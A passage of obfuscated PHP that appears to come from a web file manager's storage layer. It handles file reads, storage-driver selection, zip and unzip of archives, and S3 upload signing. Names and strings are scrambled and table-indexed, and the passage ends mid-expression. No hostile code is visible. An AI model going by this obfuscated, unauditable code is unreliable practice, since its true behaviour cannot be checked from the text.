$É·ÂÎ¸™, $İ¾´íîº, $¬Æá³ª); foreach ($üí½Ç€Ü as $İÜªû²¸) { IO::mkdir($İÜªû²¸); } foreach ($ÖØóß as $İÜªû²¸) { IO::copy($İÜªû²¸[$ê´øÛª‰[1156]], $İÜªû²¸[$ê´øÛª‰[1157]], REPEAT_REPLACE); } } public static function fileSubstr($¼èùš‡Ÿ, $ß‡ş­ëü, $şÙ—·€ = false) { $”§´ºøÚ =& $_SERVER[­á Ş³Ö]; $ƒ‡‚Ôå½ = self::driverMake($¼èùš‡Ÿ); $è—ÍØ Ï = $ƒ‡‚Ôå½->size($¼èùš‡Ÿ); $¢úªï®¤ = $ß‡ş­ëü; $²ÜÏ÷’› = $şÙ—·€; if ($ß‡ş­ëü < 0) { $ß‡ş­ëü = $è—ÍØ Ï + $ß‡ş­ëü; } if ($şÙ—·€ === !1) { $şÙ—·€ = $è—ÍØ Ï - $ß‡ş­ëü; } if ($ß‡ş­ëü + $şÙ—·€ > $è—ÍØ Ï) { $şÙ—·€ = $è—ÍØ Ï - $ß‡ş­ëü; } if (!$è—ÍØ Ï && $ƒ‡‚Ôå½->getType() == $”§´ºøÚ[106] && !$ƒ‡‚Ôå½->exist($¼èùš‡Ÿ)) { $ûÏÎÛ€ = get_path_this($¼èùš‡Ÿ); $İş’¬´Š = parse_url_query($ûÏÎÛ€); if (is_array($İş’¬´Š) && isset($İş’¬´Š[$”§´ºøÚ[32]])) { $ûÏÎÛ€ = urldecode($İş’¬´Š[$”§´ºøÚ[32]]); } throw new Exception($”§´ºøÚ[1160] . LNG($”§´ºøÚ[1161]) . $”§´ºøÚ[962] . clear_html($ûÏÎÛ€) . $”§´ºøÚ[12]); } if ($şÙ—·€ <= 0) { return $”§´ºøÚ[12]; } if ($ß‡ş­ëü < 0 || $ß‡ş­ëü >= $è—ÍØ Ï || $şÙ—·€ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\122\145\141\144\x20\x65\162\x72\157\162\41\40\163\x74\141\162\164\x3d{$ß‡ş­ëü}\x3b\x6c\145\156\147\164\x68\x3d{$şÙ—·€}\x3b\40\163\x69\x7a\x65\x3d{$è—ÍØ Ï}\x3b"); } $ÒŞÕıªÎ = $ƒ‡‚Ôå½->fileSubstr($¼èùš‡Ÿ, $ß‡ş­ëü, $şÙ—·€); if (!$ÒŞÕıªÎ && $şÙ—·€ && isset($GLOBALS[$”§´ºøÚ[1162]])) { throw new Exception($GLOBALS[$”§´ºøÚ[1162]][$”§´ºøÚ[1163]]); } return $ÒŞÕıªÎ; } private static function driverMake(&$ú’İóë¼) { $·ú«ÃÉ =& $_SERVER[­á Ş³Ö]; $¤®»Û¬Û = KodIO::parse($ú’İóë¼); if (!self::$driverListSystem) { $ø£êˆâÆ = Model($·ú«ÃÉ[764])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ø£êˆâÆ, $·ú«ÃÉ[399]); } if ($¤®»Û¬Û[$·ú«ÃÉ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¤®»Û¬Û[$·ú«ÃÉ[399]]]) { return !1; } $ú’İóë¼ = $¤®»Û¬Û[$·ú«ÃÉ[1164]]; $Äñö‰é¤ = self::driverGet($¤®»Û¬Û, $ú’İóë¼); return $Äñö‰é¤; } private static function driverGet($îÍ×™éÂ, &$éöôÌÃ) { $¾Ÿ¯íÊ” =& $_SERVER[­á Ş³Ö]; $½«íêàü = $îÍ×™éÂ[$¾Ÿ¯íÊ”[1165]]; $Ç¨ÕÉ«ô = $îÍ×™éÂ[$¾Ÿ¯íÊ”[399]]; switch ($îÍ×™éÂ[$¾Ÿ¯íÊ”[33]]) { case KodIO::KOD_IO: $ÕõÊ¨Ò’ = self::$driverListSystem[$Ç¨ÕÉ«ô]; break; case KodIO::KOD_SOURCE: $éöôÌÃ = $Ç¨ÕÉ«ô . $éöôÌÃ; $ÕõÊ¨Ò’ = array($¾Ÿ¯íÊ”[1166] => $¾Ÿ¯íÊ”[1167], $¾Ÿ¯íÊ”[6] => $îÍ×™éÂ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $÷¯ÑãÁ€ = $GLOBALS[$¾Ÿ¯íÊ”[1168]]; self::$driverListUser = array_to_keyvalue($÷¯ÑãÁ€, $¾Ÿ¯íÊ”[399]); } $ÕõÊ¨Ò’ = self::$driverListUser[$Ç¨ÕÉ«ô]; break; case KodIO::KOD_SHARE_LINK: $ÕõÊ¨Ò’ = array($¾Ÿ¯íÊ”[1166] => $¾Ÿ¯íÊ”[1169], $¾Ÿ¯íÊ”[6] => $îÍ×™éÂ); $—Çø¨­ = Action($¾Ÿ¯íÊ”[1170])->sharePathInfo($îÍ×™éÂ[$¾Ÿ¯íÊ”[84]]); $éöôÌÃ = $—Çø¨­[$¾Ÿ¯íÊ”[402]]; if (!$—Çø¨­[$¾Ÿ¯íÊ”[402]]) { $¶Ê«É¯Ü = Model($¾Ÿ¯íÊ”[592])->getInfo($—Çø¨­[$¾Ÿ¯íÊ”[593]]); $éöôÌÃ = KodIO::clear($¶Ê«É¯Ü[$¾Ÿ¯íÊ”[1171]] . $îÍ×™éÂ[$¾Ÿ¯íÊ”[1164]]); $îÍ×™éÂ[$¾Ÿ¯íÊ”[486]] = $¶Ê«É¯Ü; $îÍ×™éÂ[$¾Ÿ¯íÊ”[1147]] = $éöôÌÃ; $ÕõÊ¨Ò’ = array($¾Ÿ¯íÊ”[1166] => $¾Ÿ¯íÊ”[1172], $¾Ÿ¯íÊ”[6] => $îÍ×™éÂ); } break; case KodIO::KOD_SHARE_ITEM: $ÕõÊ¨Ò’ = array($¾Ÿ¯íÊ”[1166] => $¾Ÿ¯íÊ”[1173], $¾Ÿ¯íÊ”[6] => $îÍ×™éÂ); $¶Ê«É¯Ü = Model($¾Ÿ¯íÊ”[592])->getInfo($îÍ×™éÂ[$¾Ÿ¯íÊ”[399]]); if ($¶Ê«É¯Ü[$¾Ÿ¯íÊ”[402]] == $¾Ÿ¯íÊ”[198]) { $éöôÌÃ = KodIO::clear($¶Ê«É¯Ü[$¾Ÿ¯íÊ”[1171]] . $îÍ×™éÂ[$¾Ÿ¯íÊ”[1164]]); $îÍ×™éÂ[$¾Ÿ¯íÊ”[486]] = $¶Ê«É¯Ü; $îÍ×™éÂ[$¾Ÿ¯íÊ”[1147]] = $éöôÌÃ; $ÕõÊ¨Ò’ = array($¾Ÿ¯íÊ”[1166] => $¾Ÿ¯íÊ”[1174], $¾Ÿ¯íÊ”[6] => $îÍ×™éÂ); } else { if (!$éöôÌÃ) { $éöôÌÃ = $¶Ê«É¯Ü[$¾Ÿ¯íÊ”[402]]; } } break; default: $éöôÌÃ = $îÍ×™éÂ[$¾Ÿ¯íÊ”[84]]; $ÕõÊ¨Ò’ = array($¾Ÿ¯íÊ”[1166] => $¾Ÿ¯íÊ”[1175]); break; } $ÕËß¥å = $îÍ×™éÂ[$¾Ÿ¯íÊ”[84]]; if (!isset(self::$driverCache[$ÕËß¥å])) { $é´ ÄßÇ = strtolower($ÕõÊ¨Ò’[$¾Ÿ¯íÊ”[95]]); $«­²¼‹å = $GLOBALS[$¾Ÿ¯íÊ”[6]][$¾Ÿ¯íÊ”[89]][$¾Ÿ¯íÊ”[823]]; $æş¢ÛŠ = $¾Ÿ¯íÊ”[74] . (isset($«­²¼‹å[$é´ ÄßÇ]) ? $«­²¼‹å[$é´ ÄßÇ] : ucfirst($é´ ÄßÇ)); if (!class_exists($æş¢ÛŠ)) { show_json("{$æş¢ÛŠ}\x20\156\x6f\164\40\x65\170\x69\163\x74\163\41", !1); } $·È—Èóü = isset($ÕõÊ¨Ò’[$¾Ÿ¯íÊ”[6]]) ? $ÕõÊ¨Ò’[$¾Ÿ¯íÊ”[6]] : !1; self::$driverCache[$ÕËß¥å] = new $æş¢ÛŠ($·È—Èóü); } $¯Á ¤…œ = self::$driverCache[$ÕËß¥å]; $¯Á ¤…œ->pathDriver = $½«íêàü; $¯Á ¤…œ->pathBase = $¾Ÿ¯íÊ”[12]; if (isset($ÕõÊ¨Ò’[$¾Ÿ¯íÊ”[6]][$¾Ÿ¯íÊ”[1176]])) { $¯Á ¤…œ->pathBase = rtrim($ÕõÊ¨Ò’[$¾Ÿ¯íÊ”[6]][$¾Ÿ¯íÊ”[1176]], $¾Ÿ¯íÊ”[8]) . $¾Ÿ¯íÊ”[8]; $éöôÌÃ = $¯Á ¤…œ->pathBase . ltrim($éöôÌÃ, $¾Ÿ¯íÊ”[8]); } $éöôÌÃ = $¯Á ¤…œ->getPath($éöôÌÃ); if (isset($îÍ×™éÂ[$¾Ÿ¯íÊ”[1147]])) { $éöôÌÃ = $îÍ×™éÂ[$¾Ÿ¯íÊ”[1147]]; } $¯Á ¤…œ->path = $éöôÌÃ; return $¯Á ¤…œ; } public static function errorTips($÷…«œ• = false) { $Æ¥¥÷ßİ =& $_SERVER[­á Ş³Ö]; static $‘ÆÎÆÃî = array(); $¨Î–ú = 1000; if ($÷…«œ• === -1) { return $‘ÆÎÆÃî ? $‘ÆÎÆÃî[count($‘ÆÎÆÃî) - 1] : $Æ¥¥÷ßİ[12]; } if ($÷…«œ• === !1) { return implode($Æ¥¥÷ßİ[231], $‘ÆÎÆÃî); } if (count($‘ÆÎÆÃî) >= $¨Î–ú) { $‘ÆÎÆÃî = array_slice($‘ÆÎÆÃî, $¨Î–ú * 0.5, $¨Î–ú); } $‘ÆÎÆÃî[] = $÷…«œ•; write_log($Æ¥¥÷ßİ[162] . ACTION . $Æ¥¥÷ßİ[1177] . $÷…«œ•, $Æ¥¥÷ßİ[1178]); } public static function getLastError($©”ËşŒ« = '') { $ÙÕÊç„ = self::errorTips(-1); return $ÙÕÊç„ ? $ÙÕÊç„ : $©”ËşŒ«; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $»¥ ››; if ($»¥ ››) { return $»¥ ››; } $Ù†µŠ× = IO::init($_SERVER[­á Ş³Ö][8]); return $Ù†µŠ×; } private static function iconvSystem($ ‚©²øÎ) { return self::local()->iconvSystem($ ‚©²øÎ); } private static function iconvApp($ÚÌ·Ô½Ğ) { return self::local()->iconvApp($ÚÌ·Ô½Ğ); } public static function zipFolder($ÃâàíÆó, $âÊ˜ÓÃ‘ = "\x7a\x69\160", $ŞÕ·Õ Ç = '', $ßøÑëûö = REPEAT_RENAME) { $º¥È°Âˆ =& $_SERVER[­á Ş³Ö]; $‡Á×üÅ = IO::listPath($ÃâàíÆó); if (!$‡Á×üÅ) { return !1; } $‡Á×üÅ = array_merge($‡Á×üÅ[$º¥È°Âˆ[82]], $‡Á×üÅ[$º¥È°Âˆ[83]]); return self::zip($‡Á×üÅ, $âÊ˜ÓÃ‘, $ŞÕ·Õ Ç, $ßøÑëûö); } public static function zip($¦’¸’É, $¹çÜáÓ = "\x7a\151\160", $ô¨Ñş¿ = '', $°Áİô“¢ = REPEAT_RENAME) { $ìøªœù =& $_SERVER[­á Ş³Ö]; if (is_string($¦’¸’É) && $¦’¸’É) { $¦’¸’É = array(array($ìøªœù[84] => $¦’¸’É)); } $±€ıôæ = self::init($¦’¸’É[0][$ìøªœù[84]]); $íû¯õ§ = self::info($¦’¸’É[0][$ìøªœù[84]]); $Ö‰¢İÇ‹ = $ìøªœù[12]; $–çÒÊ‹÷ = $ìøªœù[12]; $ËĞèÀöÕ = $ìøªœù[12]; if ($ô¨Ñş¿ && substr($ô¨Ñş¿, -1, 1) != $ìøªœù[8]) { $–çÒÊ‹÷ = get_path_father($ô¨Ñş¿); $ËĞèÀöÕ = get_path_this($ô¨Ñş¿); } else { $–çÒÊ‹÷ = self::pathFather($íû¯õ§[$ìøªœù[84]]); $ËĞèÀöÕ = $íû¯õ§[$ìøªœù[32]] . $ìøªœù[10] . $¹çÜáÓ; if (count($¦’¸’É) > 1) { $²Ñã¼êÕ = IO::info($–çÒÊ‹÷); $ËĞèÀöÕ = $²Ñã¼êÕ[$ìøªœù[32]] . $ìøªœù[10] . $¹çÜáÓ; } if ($ô¨Ñş¿) { $–çÒÊ‹÷ = $ô¨Ñş¿; } } if ($±€ıôæ->getType() == $ìøªœù[106]) { $ °Î‘½ù = self::init($–çÒÊ‹÷); $”Ğµ±™– = $ °Î‘½ù->getType() == $ìøªœù[106] ? $–çÒÊ‹÷ : get_path_father($±€ıôæ->path); $”Ğµ±™– = rtrim($”Ğµ±™–, $ìøªœù[8]) . $ìøªœù[8]; mk_dir($”Ğµ±™–); } else { $Ö‰¢İÇ‹ = TEMP_FILES . $ìøªœù[1179] . time() . rand_string(8) . $ìøªœù[8]; mk_dir($Ö‰¢İÇ‹); file_put_contents($Ö‰¢İÇ‹ . $ìøªœù[1180], $ìøªœù[12]); $”Ğµ±™– = $Ö‰¢İÇ‹; } $®¨àÖç‘ = IO::info($”Ğµ±™–); if (!$®¨àÖç‘ || !$®¨àÖç‘[$ìøªœù[203]]) { show_json(LNG($ìøªœù[1181]), !1); } $áØƒõ©‡ = self::zipFileList($¦’¸’É, $Ö‰¢İÇ‹); foreach ($áØƒõ©‡ as $Œ‡³®š‚ => $¶ÕûÊ×–) { $áØƒõ©‡[$Œ‡³®š‚] = self::iconvSystem($¶ÕûÊ×–); } $ä•¾Ì„Ú = get_filename_auto($”Ğµ±™– . $ËĞèÀöÕ, $ìøªœù[12], $°Áİô“¢); KodArchive::create(self::iconvSystem($ä•¾Ì„Ú), $áØƒõ©‡); if (!IO::exist($ä•¾Ì„Ú)) { if ($Ö‰¢İÇ‹) { del_dir($Ö‰¢İÇ‹); } show_json(LNG($ìøªœù[1182]), !1); } if (!$Ö‰¢İÇ‹) { return $ä•¾Ì„Ú; } $‚¥½¶¼ = self::move($ä•¾Ì„Ú, $–çÒÊ‹÷, $°Áİô“¢); if ($Ö‰¢İÇ‹) { del_dir($Ö‰¢İÇ‹); } if (!$ä•¾Ì„Ú) { show_json(LNG($ìøªœù[1182]), !1); } return $‚¥½¶¼; } public static function unzip($šò¼Å÷¿, $¥ğ•÷Óª, $¯”–¶öÒ = "\x2d\61", $íÀÒš×— = "\x72\x65\160\x6c\141\x63\x65") { $£Ø™ûÎ =& $_SERVER[­á Ş³Ö]; $Ö¨àÑ = parent::info($šò¼Å÷¿); if (!$Ö¨àÑ) { show_json(LNG($£Ø™ûÎ[1183]), !1); } $Ä÷Œª° = IO::infoFull($¥ğ•÷Óª); if (!$Ä÷Œª°) { $¥ğ•÷Óª = IO::mkdir($¥ğ•÷Óª); } if (isset($Ä÷Œª°[$£Ø™ûÎ[402]]) && trim($Ä÷Œª°[$£Ø™ûÎ[84]], $£Ø™ûÎ[8]) != trim($¥ğ•÷Óª, $£Ø™ûÎ[8])) { $ÌÄìêº = KodIO::make($Ä÷Œª°[$£Ø™ûÎ[432]]); $ö½á…Ú¿ = IO::fileNameAuto($ÌÄìêº, $Ä÷Œª°[$£Ø™ûÎ[32]], REPEAT_RENAME_FOLDER, !0); $¥ğ•÷Óª = IO::mkdir($ÌÄìêº . $ö½á…Ú¿); } $¯”–¶öÒ = $¯”–¶öÒ && $¯”–¶öÒ != $£Ø™ûÎ[1184] ? @json_decode($¯”–¶öÒ, !0) : -1; $Åî‡¨õå = self::unzipPart($šò¼Å÷¿, $¯”–¶öÒ); if (!$Åî‡¨õå || !IO::exist($Åî‡¨õå[$£Ø™ûÎ[200]])) { show_json(LNG($£Ø™ûÎ[105]), !1); } $ëöîµÍ¶ = $Åî‡¨õå[$£Ø™ûÎ[1185]][count($Åî‡¨õå[$£Ø™ûÎ[1185]]) - 1]; if ($ëöîµÍ¶[$£Ø™ûÎ[1186]] == -1 || substr($ëöîµÍ¶[$£Ø™ûÎ[32]], -1, 1) == $£Ø™ûÎ[8]) { $»íŞÎÙÅ = $Åî‡¨õå[$£Ø™ûÎ[1187]] . rand_string(10) . $£Ø™ûÎ[8]; mk_dir($»íŞÎÙÅ); $Äïô°ìÛ = count($Åî‡¨õå[$£Ø™ûÎ[1185]]) == 1 ? IO::ext($šò¼Å÷¿) : get_path_ext($Åî‡¨õå[$£Ø™ûÎ[200]]); $¢»Ûãàˆ = KodArchive::extract(self::iconvSystem($Åî‡¨õå[$£Ø™ûÎ[200]]), $»íŞÎÙÅ, $ëöîµÍ¶[$£Ø™ûÎ[1186]], $ö½á…Ú¿, $Äïô°ìÛ); self::unzipErrorCheck($¢»Ûãàˆ, array($£Ø™ûÎ[1188], $šò¼Å÷¿, $Äïô°ìÛ, $¥ğ•÷Óª, $Åî‡¨õå)); Hook::trigger($£Ø™ûÎ[1189], $»íŞÎÙÅ); recursion_dir($»íŞÎÙÅ, $üÜªÔß, $œ¾ò¾¼·, 0); $ê¤¿Á‰ = array_merge($üÜªÔß, $œ¾ò¾¼·); $ÏÌäÎ±† = array(); foreach ($ê¤¿Á‰ as $íÏ‡¯ÔŸ) { $ÅìËª¬ = IO::move(self::iconvApp($íÏ‡¯ÔŸ), $¥ğ•÷Óª, $íÀÒš×—); if ($ÅìËª¬) { $ÏÌäÎ±†[] = $ÅìËª¬; } } del_dir($»íŞÎÙÅ); } else { $ÅìËª¬ = IO::move($Åî‡¨õå[$£Ø™ûÎ[200]], $¥ğ•÷Óª, $íÀÒš×—, get_path_this($ëöîµÍ¶[$£Ø™ûÎ[32]])); if ($ÅìËª¬) { $ÏÌäÎ±†[] = $ÅìËª¬; } } return $ÏÌäÎ±† ? $ÏÌäÎ±† : !1; } public static function unzipList($Èßºå‰Ó) { $ÜÜÒ»»Õ =& $_SERVER[­á Ş³Ö]; $¤ï¼¤ = isset($Èßºå‰Ó[$ÜÜÒ»»Õ[1190]]) ? $Èßºå‰Ó[$ÜÜÒ»»Õ[1190]] : !1; $Ñ¿¿ŠŞ = isset($Èßºå‰Ó[$ÜÜÒ»»Õ[1186]]) ? @json_decode($Èßºå‰Ó[$ÜÜÒ»»Õ[1186]], !0) : -1; $Õ ¤ş½‡ = self::unzipPart($Èßºå‰Ó[$ÜÜÒ»»Õ[84]], $Ñ¿¿ŠŞ); if (!$Õ ¤ş½‡ || !IO::exist($Õ ¤ş½‡[$ÜÜÒ»»Õ[200]])) { show_json(LNG($ÜÜÒ»»Õ[105]), !1); } $ƒ£ß–Çˆ = $Õ ¤ş½‡[$ÜÜÒ»»Õ[1185]][count($Õ ¤ş½‡[$ÜÜÒ»»Õ[1185]]) - 1]; $–Ğ¤ğÒÜ = in_array(IO::ext($Õ ¤ş½‡[$ÜÜÒ»»Õ[200]]), array($ÜÜÒ»»Õ[313], $ÜÜÒ»»Õ[1191], $ÜÜÒ»»Õ[1192], $ÜÜÒ»»Õ[1193], $ÜÜÒ»»Õ[1194], $ÜÜÒ»»Õ[1195])); if (!$¤ï¼¤ && ($ƒ£ß–Çˆ[$ÜÜÒ»»Õ[1186]] == -1 || $–Ğ¤ğÒÜ)) { $ìí„‹«“ = $Õ ¤ş½‡[$ÜÜÒ»»Õ[1187]] . get_path_this($Õ ¤ş½‡[$ÜÜÒ»»Õ[200]]) . $ÜÜÒ»»Õ[1196]; if (!IO::exist($ìí„‹«“)) { $ôŞí›§Ş = $ƒ£ß–Çˆ[$ÜÜÒ»»Õ[1186]] == -1 ? get_path_ext(IO::pathThis($Èßºå‰Ó[$ÜÜÒ»»Õ[84]])) : get_path_ext($Õ ¤ş½‡[$ÜÜÒ»»Õ[200]]); $˜ÙÜÖß§ = KodArchive::listContent(self::iconvSystem($Õ ¤ş½‡[$ÜÜÒ»»Õ[200]]), !0, $ôŞí›§Ş); self::unzipErrorCheck($˜ÙÜÖß§, array($ÜÜÒ»»Õ[1197], $Èßºå‰Ó, $Õ ¤ş½‡)); @file_put_contents($ìí„‹«“, json_encode($˜ÙÜÖß§[$ÜÜÒ»»Õ[1198]])); } return @json_decode(IO::getContent($ìí„‹«“), !0); } IO::fileOut($Õ ¤ş½‡[$ÜÜÒ»»Õ[200]], $¤ï¼¤, get_path_this($ƒ£ß–Çˆ[$ÜÜÒ»»Õ[32]])); die; } private static function zipFileList($’ı“Ş›¥, $ïÇåîóÁ = false) { $‹ğßìó§ =& $_SERVER[­á Ş³Ö]; $†ƒãé¾¹ = array(); foreach ($’ı“Ş›¥ as $òÁÊ™ç‡) { $‡…••±« = $òÁÊ™ç‡[$‹ğßìó§[84]]; if ($ïÇåîóÁ) { $‡…••±« = self::copy($òÁÊ™ç‡[$‹ğßìó§[84]], $ïÇåîóÁ, $‹ğßìó§[815]); } else { $‹æ“ı¤ = self::init($òÁÊ™ç‡[$‹ğßìó§[84]]); if ($‹æ“ı¤->getType() == $‹ğßìó§[106]) { $‡…••±« = $‹æ“ı¤->path; } } if ($‡…••±« && self::local()->exist($‡…••±«)) { $†ƒãé¾¹[$òÁÊ™ç‡[$‹ğßìó§[84]]] = $‡…••±«; } } if (!empty($†ƒãé¾¹)) { return array_values($†ƒãé¾¹); } show_json(LNG($‹ğßìó§[1161]), !1); } private static function localFilePath($·üêÈøÏ) { $¨ì¨öÖ =& $_SERVER[­á Ş³Ö]; $ˆó»øÊ¨ = KodIO::parse($·üêÈøÏ); if ($ˆó»øÊ¨[$¨ì¨öÖ[33]] == KodIO::KOD_SOURCE) { $œ—¾úÚ¡ = Model($¨ì¨öÖ[822])->fileInfoGet(KodIO::sourceID($·üêÈøÏ)); if (!$œ—¾úÚ¡[$¨ì¨öÖ[84]]) { show_json($¨ì¨öÖ[1199], !1); } $·üêÈøÏ = $œ—¾úÚ¡[$¨ì¨öÖ[84]]; } $‘Ù¬ë¨û = self::init($·üêÈøÏ); if ($‘Ù¬ë¨û->pathParse[$¨ì¨öÖ[1147]]) { $·üêÈøÏ = $‘Ù¬ë¨û->pathParse[$¨ì¨öÖ[1147]]; $‘Ù¬ë¨û = self::init($·üêÈøÏ); } $£ßĞ£ù¹ = $‘Ù¬ë¨û->getType(); if ($£ßĞ£ù¹ == $¨ì¨öÖ[106] || $£ßĞ£ù¹ == $¨ì¨öÖ[1200]) { if (!$‘Ù¬ë¨û->exist($‘Ù¬ë¨û->path)) { show_json(LNG($¨ì¨öÖ[105]), !1); } return $‘Ù¬ë¨û->path; } return !1; } public static function unzipPart($İÄ¤°ÖÍ, $”ª‡ş¤§ = -1) { $¸ šå€È =& $_SERVER[­á Ş³Ö]; $™ëæ¦ = IO::pathThis($İÄ¤°ÖÍ); if (!$”ª‡ş¤§ || $”ª‡ş¤§ == -1) { $øÇù²Ïú = array(array($¸ šå€È[32] => $™ëæ¦, $¸ šå€È[1186] => -1)); $øÇù²Ïú[0][$¸ šå€È[1201]] = $øÇù²Ïú[0][$¸ šå€È[32]]; } else { if (is_array($”ª‡ş¤§)) { $øÇù²Ïú = $”ª‡ş¤§; $—Ê«¼¸õ = count($øÇù²Ïú) - 1; for ($ê¿¼Èñõ = 0; $ê¿¼Èñõ <= $—Ê«¼¸õ; $ê¿¼Èñõ++) { $Ù¯³àÙ® = $øÇù²Ïú[$ê¿¼Èñõ]; $åŸ¿ĞÚ = get_path_this($Ù¯³àÙ®[$¸ šå€È[32]]) . (checkExtSafe($Ù¯³àÙ®[$¸ šå€È[32]]) ? $¸ šå€È[12] : $¸ šå€È[1202]); $øÇù²Ïú[$ê¿¼Èñõ][$¸ šå€È[1201]] = $¸ šå€È[1203] . intval($Ù¯³àÙ®[$¸ šå€È[1186]]) . $¸ šå€È[386] . $åŸ¿ĞÚ; if ($ê¿¼Èñõ == 0) { continue; } $øÇù²Ïú[$ê¿¼Èñõ][$¸ šå€È[1201]] = $øÇù²Ïú[$ê¿¼Èñõ - 1][$¸ šå€È[1201]] . $¸ šå€È[1204] . $øÇù²Ïú[$ê¿¼Èñõ][$¸ šå€È[1201]]; } } } if (!is_array($øÇù²Ïú) || count($øÇù²Ïú) == 0) { return !1; } $¡´í¤¼ß = $øÇù²Ïú[count($øÇù²Ïú) - 1]; if (!IO::exist($İÄ¤°ÖÍ)) { return !1; } $ş´´²²à = TEMP_FILES . $¸ šå€È[1205] . kodIO::hashPathSafe($İÄ¤°ÖÍ) . $¸ šå€È[8]; $‹¦ª‚Ô› = $ş´´²²à . $¡´í¤¼ß[$¸ šå€È[1201]]; mk_dir($ş´´²²à); file_put_contents(TEMP_FILES . $¸ šå€È[1180], $¸ šå€È[12]); if (IO::exist($‹¦ª‚Ô›)) { return array($¸ šå€È[200] => $‹¦ª‚Ô›, $¸ šå€È[1185] => $øÇù²Ïú, $¸ šå€È[1187] => $ş´´²²à); } $¬“È÷³£ = self::localFilePath($İÄ¤°ÖÍ); if (!$¬“È÷³£) { $¬“È÷³£ = $ş´´²²à . $¸ šå€È[1206]; if (!IO::exist($¬“È÷³£)) { self::copy($İÄ¤°ÖÍ, $ş´´²²à, !1, get_path_this($¬“È÷³£)); } } if (!$¬“È÷³£ || !IO::exist($¬“È÷³£)) { return !1; } if ($¡´í¤¼ß[$¸ šå€È[1186]] == -1) { return array($¸ šå€È[200] => $¬“È÷³£, $¸ šå€È[1185] => $øÇù²Ïú, $¸ šå€È[1187] => $ş´´²²à); } $ ‚úÖÒã = $¬“È÷³£; foreach ($øÇù²Ïú as $ê¿¼Èñõ => $Ù¯³àÙ®) { if (!$Ù¯³àÙ® || $Ù¯³àÙ®[$¸ šå€È[1186]] == $¸ šå€È[1184]) { break; } if (substr($Ù¯³àÙ®[$¸ šå€È[32]], -1, 1) == $¸ šå€È[8]) { break; } $Éèó–çô = in_array(get_path_ext($Ù¯³àÙ®[$¸ šå€È[1201]]), array($¸ šå€È[313], $¸ šå€È[1191], $¸ šå€È[1192], $¸ šå€È[1193], $¸ šå€È[1194], $¸ šå€È[1195])); $²úİ†ÓŸ = $ê¿¼Èñõ == count($øÇù²Ïú) - 1 && $Éèó–çô; $í€—ÔÄ‰ = $ş´´²²à . $Ù¯³àÙ®[$¸ šå€È[1201]]; $áŞÖİ¾” = $ş´´²²à . get_path_this($Ù¯³àÙ®[$¸ šå€È[32]]); if (IO::exist($í€—ÔÄ‰)) { $ ‚úÖÒã = $í€—ÔÄ‰; continue; } $Ÿ¶³’µÛ = $ê¿¼Èñõ == 0 ? get_path_ext($™ëæ¦) : get_path_ext($ ‚úÖÒã); $¦øºàÂÙ = KodArchive::extract(self::iconvSystem($ ‚úÖÒã), $ş´´²²à, $Ù¯³àÙ®[$¸ šå€È[1186]], $Ÿ‡§¾², $Ÿ¶³’µÛ); self::unzipErrorCheck($¦øºàÂÙ, array($¸ šå€È[1207], $İÄ¤°ÖÍ, $øÇù²Ïú, $Ù¯³àÙ®, $í€—ÔÄ‰)); if (IO::exist($áŞÖİ¾”)) { IO::rename($áŞÖİ¾”, get_path_this($í€—ÔÄ‰)); } $ ‚úÖÒã = $í€—ÔÄ‰; } $‹¦ª‚Ô› = $ ‚úÖÒã; return array($¸ šå€È[200] => $ ‚úÖÒã, $¸ šå€È[1185] => $øÇù²Ïú, $¸ šå€È[1187] => $ş´´²²à); } private static function unzipErrorCheck($œîù«¶°, $î¡ÙüÇ– = false) { $ûŸ¯ú½Ö =& $_SERVER[­á Ş³Ö]; if ($œîù«¶°[$ûŸ¯ú½Ö[1208]]) { return !0; } write_log(array($ûŸ¯ú½Ö[1209], $œîù«¶°, $î¡ÙüÇ–), $ûŸ¯ú½Ö[1210]); show_json($ûŸ¯ú½Ö[1211] . json_encode($œîù«¶°[$ûŸ¯ú½Ö[1198]]), !1); die; } } goto CãÉçÑ«ğğ; cà„ÁÎ²Ş: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ğ®ºäÙ¸) { parent::__construct($ğ®ºäÙ¸); } public function uploadFormData($—ì¢¹İÀ, $¯»øÂÔË = 3600) { $³ºĞ÷ù =& $_SERVER[­á Ş³Ö]; $ƒÁ•¼ ± = $³ºĞ÷ù[199]; $©§œ™¹÷ = $³ºĞ÷ù[1354]; $—Ÿ¡“æ = $³ºĞ÷ù[62]; $„ÔÆµ²Ó = gmdate($³ºĞ÷ù[1355]); $Œú‰ûØ¼ = gmdate($³ºĞ÷ù[747]); $èŞ…Ìƒ¥ = $³ºĞ÷ù[1356]; $”¥–İ«µ = $¯»øÂÔË . $³ºĞ÷ù[12]; $ÆÕ‡ß = $³ºĞ÷ù[1318]; $õ©Êƒü = array($this->accessKey, $Œú‰ûØ¼, $this->region, $—Ÿ¡“æ, $èŞ…Ìƒ¥); $©üü¦½ = implode($³ºĞ÷ù[8], $õ©Êƒü); $ùÔÓ×í¥ = array($³ºĞ÷ù[1320] => gmdate($³ºĞ÷ù[1319], strtotime($³ºĞ÷ù[1357])), $³ºĞ÷ù[1321] => array(array($³ºĞ÷ù[1323] => $this->bucket), array($³ºĞ÷ù[1322] => $ƒÁ•¼ ±), array($³ºĞ÷ù[1324], $³ºĞ÷ù[1325], $³ºĞ÷ù[12]), array($³ºĞ÷ù[1324], $³ºĞ÷ù[1358], $³ºĞ÷ù[12]), array($³ºĞ÷ù[1324], $³ºĞ÷ù[1359], $³ºĞ÷ù[12]), array($³ºĞ÷ù[1326] => $ÆÕ‡ß), array($³ºĞ÷ù[1360] => $©üü¦½), array($³ºĞ÷ù[1361] => $©§œ™¹÷), array($³ºĞ÷ù[1362] => $„ÔÆµ²Ó), array($³ºĞ÷ù[1363] => $”¥–İ«µ))); $¹Øó Ÿç = base64_encode(json_encode($ùÔÓ×í¥)); $ƒëÉúæô = hash_hmac($³ºĞ÷ù[1364], $Œú‰ûØ¼, $³ºĞ÷ù[1365] . $this->secret, !0); $àõ³«¬ = hash_hmac($³ºĞ÷ù[1364], $this->region, $ƒëÉúæô, !0); $áõìŸÉ‘ = hash_hmac($³ºĞ÷ù[1364], $—Ÿ¡“æ, $àõ³«¬, !0); $Êó©¡í = hash_hmac($³ºĞ÷ù[1364], $èŞ…Ìƒ¥, $áõìŸÉ‘, !0); $ºùË„† = hash_hmac($³ºĞ÷ù[1364], $¹Øó Ÿç, 